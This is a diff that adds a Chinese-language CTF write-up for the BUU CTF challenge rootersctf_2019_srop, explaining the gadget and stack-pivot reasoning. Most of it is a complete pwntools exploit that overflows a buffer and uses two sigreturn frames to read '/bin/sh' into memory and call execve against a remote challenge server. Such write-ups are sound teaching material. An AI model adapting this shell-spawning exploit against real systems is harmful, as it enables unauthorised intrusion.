@@ -2309,3 +2309,61 @@ if __name__ == "__main__":
     main()
 ```
 
+#### 例题 3：rootersctf_2019_srop
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#rootersctf_2019_srop)
+
+找一下能劫持 rax 的 gadget。
+
+<img width="1088" height="121" alt="image" src="https://github.com/user-attachments/assets/ae3e1fff-0860-4c64-8ef1-998bc30e4a21" />
+
+这里有一个 `pop rax;syscall;leave;ret`，`pop rax;syscall` 很好解决，在 payload 后面接一个 15 就可以启动 sigreturn。
+
+但是 `leave` 会销毁当前栈，也就是 `mov rsp,rbp` + `pop rbp`，把 rbp 赋值给 rsp，old rbp 赋值给 rbp。
+
+而 `ret` 则会 `pop rip`，如果我们没有劫持 rbp，此时 rsp 指向了 0x0，就会引发错误。
+
+因此第一次 SROP 应该设置一个安全的栈底。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28172
+io = remote(host,port)
+# io = process("./rootersctf_2019_srop")
+data = 0x402000
+syscall_lea_ret = 0x401033
+pop_rax_syscall_lea_ret = 0x401032
+
+def main():
+    io.recvuntil(b"Hey, can i get some feedback for the CTF?\n")
+    frame1 = SigreturnFrame()
+    frame1.rax = constants.SYS_read
+    frame1.rdi = 0   # stdin
+    frame1.rsi = data
+    frame1.rdx = 0x400
+    frame1.rbp = data + 0x80
+    frame1.rsp = data + 0x300
+    frame1.rip = syscall_lea_ret
+    payload_1 = b'A'*0x88 + p64(pop_rax_syscall_lea_ret) + p64(15) + bytes(frame1)
+    io.send(payload_1)
+    frame2 = SigreturnFrame()
+    frame2.rax = constants.SYS_execve
+    frame2.rdi = data
+    frame2.rsi = 0
+    frame2.rdx = 0
+    frame2.rip = syscall_lea_ret
+    payload_2 = b"/bin/sh\x00"
+    payload_2 = payload_2.ljust(0x80,b'\x00')
+    payload_2 += b'B'*8 + p64(pop_rax_syscall_lea_ret) + p64(15) + bytes(frame2)    
+    io.send(payload_2)
+    io.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
